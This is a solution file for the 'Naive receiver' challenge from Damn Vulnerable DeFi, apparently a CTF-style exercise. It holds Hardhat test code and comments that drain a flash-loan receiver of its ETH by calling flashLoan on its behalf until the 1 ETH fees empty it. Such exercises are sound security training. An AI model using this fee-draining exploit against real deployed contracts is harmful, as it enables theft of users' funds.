const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Naive receiver", function () {
  let deployer, user, attacker;

  // Pool has 1000 ETH in balance
  const ETHER_IN_POOL = ethers.utils.parseEther("1000");

  // Receiver has 10 ETH in balance
  const ETHER_IN_RECEIVER = ethers.utils.parseEther("10");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, user, attacker] = await ethers.getSigners();

    const LenderPoolFactory = await ethers.getContractFactory(
      "NaiveReceiverLenderPool",
      deployer
    );
    const FlashLoanReceiverFactory = await ethers.getContractFactory(
      "FlashLoanReceiver",
      deployer
    );

    this.pool = await LenderPoolFactory.deploy();
    await deployer.sendTransaction({
      to: this.pool.address,
      value: ETHER_IN_POOL,
    });

    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      ETHER_IN_POOL
    );
    expect(await this.pool.fixedFee()).to.be.equal(
      ethers.utils.parseEther("1")
    );

    this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
    await deployer.sendTransaction({
      to: this.receiver.address,
      value: ETHER_IN_RECEIVER,
    });

    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
      ETHER_IN_RECEIVER
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Exploit version 1: just run a loop 10 times to drain the receiver of 10 ETH
    // This requires 10 transactions though
    // for(let i = 0; i < 10; i++) {
    //   await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
    // }

    // Exploit version 2: all the 10 loans for draining the receiver done in a transaction using an exploit contract
    const NaiveReceiverExploit = await ethers.getContractFactory(
      "NaiveReceiverExploit",
      deployer
    );
    const naiveReceiverExploit = await NaiveReceiverExploit.deploy();
    await naiveReceiverExploit.exploit(
      this.pool.address,
      this.receiver.address
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // All ETH has been drained from the receiver
    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
      "0"
    );
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      ETHER_IN_POOL.add(ETHER_IN_RECEIVER)
    );
  });
});

// https://www.damnvulnerabledefi.xyz/challenges/2.html

// Solution:
// The exploit lies in the fact that the flashLoan method in the pool
// has borrower as an argument. This means that you can borrow loans
// on behalf of anyone. And every loan causes a 1 ETH fee to be paid
// back to the pool. So all we need is to call the flashLoan method
// with the borrower as the receiver address to drain ether from the receiver
// As the receiver has 10 ETH and the fixed fee for the pool is 1 ETH
// we need to call the flashLoan method with the receiver as the borrower
// 10 times. This can be done in 1 transaction if you do all 10 calls using
// one method in an exploit contract
